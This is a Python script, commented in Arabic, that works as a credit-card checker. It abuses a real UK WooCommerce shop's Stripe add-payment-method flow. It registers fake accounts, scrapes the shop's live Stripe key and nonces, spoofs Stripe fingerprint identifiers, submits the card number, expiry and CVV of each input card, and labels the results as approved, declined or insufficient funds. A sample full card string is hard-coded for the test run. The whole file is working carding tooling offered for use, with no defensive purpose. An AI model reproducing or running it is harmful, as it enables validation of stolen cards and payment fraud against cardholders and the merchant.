import requests
from user_agent import generate_user_agent
import re
import random
import string
import uuid
import time

def Stripe4(ccx):
    """
    فحص بطاقة على lettercrafttopsignsuk.co.uk (Stripe - Auth)
    ccx: رقم|شهر|سنة|cvv
    """
    try:
        # ===== تجزئة البطاقة =====
        ccx = ccx.strip()
        n = ccx.split("|")[0]
        mm = ccx.split("|")[1]
        yy = ccx.split("|")[2]
        cvc = ccx.split("|")[3].strip()
        
        if "20" in yy:
            yy = yy.split("20")[1]
        if len(yy) == 2:
            yy_full = f"20{yy}"
        else:
            yy_full = yy
        
        n = n.replace(" ", "")
        
        user = generate_user_agent()
        r = requests.Session()
        
        # ===== 1. فتح صفحة الحساب لاستخراج register nonce =====
        #print("\n[1/7] فتح صفحة الحساب...")
        headers = {
            'authority': 'www.lettercrafttopsignsuk.co.uk',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'user-agent': user,
        }
        response = r.get('https://www.lettercrafttopsignsuk.co.uk/my-account/', headers=headers)
        #print(f"    ✅ HTTP {response.status_code}")
        
        reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text)
        if not reg:
            return "❌ Register nonce not found"
        reg = reg.group(1)
        #print(f"    🔑 Register nonce: {reg}")
        
        # ===== 2. تسجيل حساب جديد =====
        #print("\n[2/7] تسجيل حساب جديد...")
        email = f"user{random.randint(1000,9999)}{random.randint(1000,9999)}@gmail.com"
        password = f"Pass{random.randint(1000,9999)}"
        
        headers = {
            'authority': 'www.lettercrafttopsignsuk.co.uk',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://www.lettercrafttopsignsuk.co.uk',
            'user-agent': user,
        }
        
        data = {
            'email': email,
            'password': password,
            'woocommerce-register-nonce': reg,
            '_wp_http_referer': '/my-account/',
            'register': 'Register',
        }
        
        response = r.post('https://www.lettercrafttopsignsuk.co.uk/my-account/', data=data, headers=headers)
        #print(f"    ✅ تم التسجيل: {email}")
        
        # ===== 3. فتح صفحة إضافة البطاقة =====
        #print("\n[3/7] فتح صفحة إضافة البطاقة...")
        headers = {
            'authority': 'www.lettercrafttopsignsuk.co.uk',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9',
            'user-agent': user,
        }
        response = r.get('https://www.lettercrafttopsignsuk.co.uk/my-account/add-payment-method/', headers=headers)
        #print(f"    ✅ HTTP {response.status_code}")
        
        # استخراج Stripe Key
        pk_live = re.search(r'(pk_live_[A-Za-z0-9_-]+)', response.text)
        if not pk_live:
            return "❌ Stripe key not found"
        pk_live = pk_live.group(1)
        #print(f"    🔑 Stripe key found")
        
        # استخراج AJAX nonce
        addnonce = re.search(r'name="_ajax_nonce" value="(.*?)"', response.text)
        if not addnonce:
            addnonce = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text)
            if not addnonce:
                return "❌ AJAX nonce not found"
            addnonce = addnonce.group(1)
        else:
            addnonce = addnonce.group(1)
        #print(f"    🔑 AJAX nonce: {addnonce}")
        
        # ===== 4. جلب stripe identifiers (guid, muid, sid) =====
        #print("\n[4/7] جلب Stripe identifiers...")
        headers = {
            'authority': 'm.stripe.com',
            'accept': '*/*',
            'content-type': 'text/plain;charset=UTF-8',
            'origin': 'https://m.stripe.network',
            'user-agent': user,
        }
        response = r.post('https://m.stripe.com/6', headers=headers, data='')
        try:
            detet = response.json()
            guid = detet.get('guid', str(uuid.uuid4()))
            muid = detet.get('muid', str(uuid.uuid4()))
            sid = detet.get('sid', str(uuid.uuid4()))
            #print(f"    ✅ GUID, MUID, SID obtained")
        except:
            guid = str(uuid.uuid4())
            muid = str(uuid.uuid4())
            sid = str(uuid.uuid4())
            #print(f"    ⚠️ Generated identifiers")
        
        # ===== 5. Consumer session lookup =====
        #print("\n[5/7] Consumer session lookup...")
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'user-agent': user,
        }
        lookup_data = {
            'request_surface': 'web_payment_element',
            'email_address': email,
            'email_source': 'default_value',
            'session_id': str(uuid.uuid4()),
            'key': pk_live,
        }
        response = r.post('https://api.stripe.com/v1/consumers/sessions/lookup', data=lookup_data, headers=headers)
        #print(f"    ✅ HTTP {response.status_code}")
        
        # ===== 6. إرسال البطاقة إلى Stripe =====
        #print("\n[6/7] إرسال البطاقة إلى Stripe...")
        client_session_id = str(uuid.uuid4())
        elements_session_config_id = str(uuid.uuid4())
        times = random.randint(10000, 99999)
        
        headers = {
            'authority': 'api.stripe.com',
            'accept': 'application/json',
            'content-type': 'application/x-www-form-urlencoded',
            'origin': 'https://js.stripe.com',
            'user-agent': user,
        }
        
        stripe_data = f'type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy_full}&card[exp_month]={mm}&allow_redisplay=unspecified&billing_details[address][country]=GB&payment_user_agent=stripe.js%2Fea2f4b4e05%3B+stripe-js-v3%2Fea2f4b4e05%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.lettercrafttopsignsuk.co.uk&time_on_page={times}&client_attribution_metadata[client_session_id]={client_session_id}&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]={elements_session_config_id}&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid={guid}&muid={muid}&sid={sid}&key={pk_live}&_stripe_version=2025-09-30.clover'
        
        response = r.post('https://api.stripe.com/v1/payment_methods', data=stripe_data, headers=headers)
        
        try:
            resp_json = response.json()
            if 'id' not in resp_json:
                error_msg = resp_json.get('error', {}).get('message', 'Unknown')
                return f"❌ Stripe Error: {error_msg}"
            payment_id = resp_json['id']
            #print(f"    ✅ Payment method ID: {payment_id}")
        except Exception as e:
            return f"❌ Could not create payment method: {str(e)}"
        
        # ===== 7. تأكيد setup intent =====
        #print("\n[7/7] تأكيد Setup Intent...")
        headers = {
            'authority': 'www.lettercrafttopsignsuk.co.uk',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'origin': 'https://www.lettercrafttopsignsuk.co.uk',
            'referer': 'https://www.lettercrafttopsignsuk.co.uk/my-account/add-payment-method/',
            'user-agent': user,
            'x-requested-with': 'XMLHttpRequest',
        }
        
        data = {
            'action': 'wc_stripe_create_and_confirm_setup_intent',
            'wc-stripe-payment-method': payment_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': addnonce,
        }
        
        response = r.post('https://www.lettercrafttopsignsuk.co.uk/wp-admin/admin-ajax.php', data=data, headers=headers)
        text = response.text
        
        # ===== تحليل النتيجة =====
        #print("\n" + "="*60)
        if 'card was declined' in text.lower():
            return '❌ The card was declined.'
        elif 'your card could not be set up' in text.lower():
            return '❌ Your card could not be set up for future usage.'
        elif 'your card number is incorrect' in text.lower():
            return '❌ Card number is incorrect.'
        elif 'duplicate card exists' in text.lower():
            return '✅ Approved (Duplicate)'
        elif 'insufficient funds' in text.lower():
            return '💰 Insufficient Funds'
        elif 'risk_threshold' in text.lower():
            return '⚠️ Risk Threshold'
        elif '"success":true' in text or 'success' in text.lower():
            return '✅ Approved'
        else:
            try:
                error_msg = response.json().get('data', {}).get('error', {}).get('message', '')
                if error_msg:
                    return f'❌ {error_msg}'
            except:
                pass
            return '❌ Declined'
        
    except Exception as e:
        return f'❌ Error: {str(e)}'


if __name__ == '__main__':
    test_card = "5294158321468738|12|2026|904"
    result = Stripe4(test_card)
    print(f'\n📇 Card: {test_card}\n📊 Result: {result}')